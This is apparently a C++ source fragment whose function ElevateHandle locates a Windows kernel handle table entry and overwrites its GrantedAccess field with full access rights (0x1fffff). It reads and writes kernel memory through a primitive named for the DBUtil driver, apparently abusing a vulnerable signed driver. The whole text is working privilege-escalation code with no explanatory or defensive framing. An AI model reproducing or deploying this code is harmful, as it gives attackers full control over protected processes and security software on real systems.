#include "kernelutils.cpp"

void ElevateHandle(DWORD64 hTableAddr, ULONGLONG hValue) {
	DWORD64 HandleTableEntry = ExpLookupHandleTableEntry(hTableAddr, hValue);
	std::cout << "entry address: " << std::hex << HandleTableEntry << std::endl;
	BYTE forentry[16];
	for (int i = 0; i < 16; i++)
		forentry[i] = ReadMemoryBYTE(Device, HandleTableEntry + i);

	HANDLE_TABLE_ENTRY* HandleTableEntryObject = (HANDLE_TABLE_ENTRY*)(void*)forentry;

	std::cout << "Granted Access Bits: " << HandleTableEntryObject->GrantedAccess << std::endl;

	HandleTableEntryObject->GrantedAccess = 0x1fffff;

	BYTE NewHandle[16];

	std::memcpy(NewHandle, HandleTableEntryObject, 16);

	for (int i = 0; i < 16; i++)
	{
		DWORD NewHandleData = NewHandle[i];
		WriteMemoryPrimitive_DBUtil(Device, sizeof(BYTE), HandleTableEntry + i, &NewHandleData);

	}
}
